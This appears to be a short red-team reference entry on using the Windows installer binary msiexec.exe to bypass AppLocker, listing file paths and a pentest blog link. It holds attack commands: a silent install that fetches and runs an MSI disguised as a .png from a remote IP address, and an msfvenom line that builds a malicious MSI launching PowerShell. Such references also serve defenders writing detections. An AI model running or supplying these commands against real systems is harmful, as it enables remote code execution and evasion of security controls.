## Msiexec.exe

* Functions: Execute

```
msiexec /quiet /i cmd.msi
msiexec /q /i http://192.168.100.3/tmp/cmd.png
```

Acknowledgements:
* ? - @netbiosX

Code sample:
* 

Resources:
* https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/

Full path:
```
c:\windows\system32\msiexec.exe
c:\windows\sysWOW64\msiexec.exe
```

Notes:
Generate MSI file:
```
msfvenom -f msi -p windows/exec CMD=powershell.exe > powershell.msi    
```



